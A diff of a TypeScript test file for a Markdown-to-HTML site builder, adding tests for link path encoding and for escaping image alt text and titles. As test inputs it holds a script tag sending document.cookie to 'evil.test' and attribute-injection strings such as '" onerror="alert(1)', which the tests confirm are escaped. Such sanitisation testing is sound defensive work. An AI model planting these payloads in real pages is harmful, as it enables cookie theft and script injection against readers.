@@ -3,7 +3,7 @@ import { existsSync, mkdirSync, readFileSync, readdirSync, symlinkSync, writeFil
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 
-import { buildSite, createConverter, defaultOut, formatResult, MARKER, parseArguments, type MarkedClass, type ToHtml } from "./build-site.mts";
+import { buildSite, createConverter, defaultOut, formatResult, MARKER, parseArguments, type MarkedClass, type Renderer, type ToHtml } from "./build-site.mts";
 import { CouldNotRun } from "./lib/outcome.mts";
 import { createFolder, initGit, mermaid, SCRIPTS } from "./support.mts";
 
@@ -88,6 +88,24 @@ describe("the options of a build", () => {
     expect(readFileSync(join(out, "02-c4.html"), "utf8")).toContain('<a target="_blank" rel="noopener noreferrer" href="https://example.test/acme/app/blob/main/server/web.ts">code</a>');
   });
 
+  it("write a link that leaves the set with every part of its path encoded", () => {
+    const root = createFolder({ "docs/README.md": "# T\n\n[web](../my%20notes/a%3Ab.ts)\n", "my notes/a:b.ts": "", "m.js": "" });
+
+    initGit(root);
+
+    const linked = (options: { repoUrl?: string }): string => {
+      const out = join(createFolder(), "site");
+
+      buildSite({ folder: join(root, "docs"), out, toHtml, mermaidBundle: join(root, "m.js"), ...options });
+
+      return /<a [^>]*href="([^"]*)"[^>]*>web<\/a>/.exec(readFileSync(join(out, "index.html"), "utf8"))?.[1] ?? "";
+    };
+
+    expect(linked({ repoUrl: "https://example.test/blob/main" })).toBe("https://example.test/blob/main/my%20notes/a%3Ab.ts");
+    // With no address given it is the file on disk, from where the copy is.
+    expect(linked({})).toMatch(/^(?:\.\.\/)+.*\/my%20notes\/a%3Ab\.ts$/);
+  });
+
   it("take a start page from outside the folder, and the documents link back to it", () => {
     const root = createFolder({
       "docs/architecture.md": "# Index\n\n[one](architecture/01.md)\n",
@@ -164,9 +182,9 @@ describe("a document that could harm its reader", () => {
     const seen: string[] = [];
     // The converter is fetched, so here it is a stand-in that renders one HTML token the way it is told to.
     const Marked = class {
-      private readonly html: (token: { text: string }) => string;
+      private readonly html: Renderer["html"];
 
-      constructor(options: { renderer: { html: (token: { text: string }) => string } }) {
+      constructor(options: { renderer: Renderer }) {
         this.html = options.renderer.html;
       }
 
@@ -179,6 +197,28 @@ describe("a document that could harm its reader", () => {
 
     expect(createConverter(Marked)('<script>fetch("https://evil.test/" + document.cookie)</script><b>x</b>')).toBe('&lt;script&gt;fetch("https://evil.test/" + document.cookie)&lt;/script&gt;<b>x</b>');
     expect(seen).toHaveLength(1);
+  });
+
+  it("has a picture's alt text and title written as text, which the converter does not do", () => {
+    // A stand-in that renders one picture the way it is told to.
+    const Marked = class {
+      private readonly image: Renderer["image"];
+
+      constructor(options: { renderer: Renderer }) {
+        this.image = options.renderer.image;
+      }
+
+      parse(markdown: string): string {
+        const [alt = "", href = "", title] = markdown.split("|");
+
+        return this.image({ href, text: alt, ...(title === undefined ? {} : { title }) });
+      }
+    } as unknown as MarkedClass;
+    const picture = createConverter(Marked);
+
+    expect(picture('" onerror="alert(1)|x.png')).toBe('<img src="x.png" alt="&quot; onerror=&quot;alert(1)">');
+    expect(picture('The "moi" <logo>|a b.png?x=1&y=2|"t"')).toBe('<img src="a b.png?x=1&amp;y=2" alt="The &quot;moi&quot; &lt;logo&gt;" title="&quot;t&quot;">');
+    expect(picture('x|" onerror="alert(1)')).toBe('<img src="&quot; onerror=&quot;alert(1)" alt="x">');
   });
 
   it("has a link that would run a script lead nowhere, and the build says so", () => {
